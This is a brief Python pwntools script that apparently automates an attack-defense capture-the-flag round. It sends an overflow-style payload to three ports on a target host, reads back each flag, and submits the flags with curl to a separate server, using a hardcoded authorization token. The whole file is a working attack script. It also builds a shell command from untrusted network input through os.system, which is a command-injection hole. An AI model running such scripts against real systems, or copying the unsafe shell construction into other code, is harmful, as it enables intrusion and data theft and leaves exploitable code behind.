from pwn import *
import os, time

submit_ip = "34.125.160.72"

ip = "34.16.141.53"

port_list = [10001,10002,10004]
token = "f889fc8ec9c1557c03db5e00b98189d9"

for port in port_list:
    p = remote(ip,port)
    p.sendline(b"A"*0x10 + b"KEY")
    flag = p.recvline()[:-1].decode('utf-8')
    p.close()
    print(flag)
    cmd = "curl -X POST http://%s:19999/api/flag -H 'Authorization: %s' -d '{ \"flag\": \"%s\" }'" % (submit_ip,token,flag)
    res = os.system(cmd)
